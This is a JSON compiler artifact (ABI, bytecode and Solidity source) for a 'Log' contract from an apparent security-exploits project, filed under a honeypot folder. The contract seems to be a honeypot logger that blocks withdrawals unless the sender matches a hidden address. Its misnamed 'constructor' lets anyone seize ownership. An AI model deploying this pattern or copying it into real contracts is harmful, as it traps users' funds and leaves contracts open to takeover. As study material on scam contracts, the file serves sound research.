{
  "contractName": "Log",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "LastLine",
      "outputs": [
        {
          "name": "sender",
          "type": "address"
        },
        {
          "name": "amount",
          "type": "uint256"
        },
        {
          "name": "note",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "constructor",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "changeEthAddress",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_sender",
          "type": "address"
        },
        {
          "name": "_amount",
          "type": "uint256"
        },
        {
          "name": "_note",
          "type": "string"
        }
      ],
      "name": "LogTransfer",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506107a4806100206000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806310176f8614610067578063416f5483146100fa57806390fa17bb1461013d578063da223bc314610154575b600080fd5b34801561007357600080fd5b506100f8600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190803590602001908201803590602001908080601f016020809104026020016040519081016040528093929190818152602001838380828437820191505050505050919291929050505061021e565b005b34801561010657600080fd5b5061013b600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061045a565b005b34801561014957600080fd5b506101526104f9565b005b34801561016057600080fd5b5061016961057c565b604051808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200183815260200180602001828103825283818151815260200191508051906020019080838360005b838110156101e15780820151818401526020810190506101c6565b50505050905090810190601f16801561020e5780820380516001836020036101000a031916815260200191505b5094505050505060405180910390f35b60405180807f77697468647261770000000000000000000000000000000000000000000000008152506008019050604051809103902060001916816040518082805190602001908083835b60208310151561028e5780518252602082019150602081019050602083039250610269565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902060001916141561032257600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614151561032157600080fd5b5b82600360000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600360010181905550806003600201908051906020019061038992919061064c565b5060026003908060018154018082558091505090600182039060005260206000209060030201600090919290919091506000820160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168160000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060018201548160010155600282018160020190805460018160011615610100020316600290046104519291906106cc565b50505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156104b557600080fd5b80600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b60038060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690806001015490806002018054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156106425780601f1061061757610100808354040283529160200191610642565b820191906000526020600020905b81548152906001019060200180831161062557829003601f168201915b5050505050905083565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061068d57805160ff19168380011785556106bb565b828001600101855582156106bb579182015b828111156106ba57825182559160200191906001019061069f565b5b5090506106c89190610753565b5090565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106107055780548555610742565b8280016001018555821561074257600052602060002091601f016020900482015b82811115610741578254825591600101919060010190610726565b5b50905061074f9190610753565b5090565b61077591905b80821115610771576000816000905550600101610759565b5090565b905600a165627a7a7230582065babba3fc6901a35e7a7fdf6f276a9b351d05e749f528f4085682339404b3750029",
  "source": "pragma solidity ^0.4.19;\n\ncontract Log {\n  address private owner;\n  address private ethAddress;\n\n  struct Message {\n    address sender;\n    uint256 amount;\n    string note;\n  }\n\n  Message[] History;\n  Message public LastLine;\n\n  function constructor() {\n    owner = msg.sender;\n    ethAddress = msg.sender;\n  }\n\n  function changeEthAddress(address _addr) {\n    require(msg.sender == owner);\n    ethAddress = _addr;\n  }\n\n  function LogTransfer(address _sender, uint256 _amount, string _note) {\n    if (keccak256(_note) == keccak256(\"withdraw\")) {\n      require(_sender == ethAddress);\n    }\n    LastLine.sender = _sender;\n    LastLine.amount = _amount;\n    LastLine.note = _note;\n    History.push(LastLine);\n  }\n}",
  "sourcePath": "/home/hayek/proj/security-exploits/contracts/HoneyPot1/Log.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.23+commit.124ca40d.Emscripten.clang"
  },
  "schemaVersion": "2.0.0",
  "updatedAt": "2018-06-24T04:16:54.713Z"
}